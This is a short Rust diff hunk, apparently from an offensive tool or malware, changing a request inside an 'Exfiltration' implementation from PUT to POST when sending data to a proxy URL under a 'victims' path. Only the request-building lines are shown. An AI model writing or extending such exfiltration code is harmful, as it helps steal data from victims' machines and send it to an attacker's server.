@@ -73,7 +73,7 @@ impl Exfiltration {
         state
             .0
             .proxy
-            .put(format!(
+            .post(format!(
                 "{}/victims/{}/{}",
                 state.0.proxy_url,
                 Uuid::new_v4(),
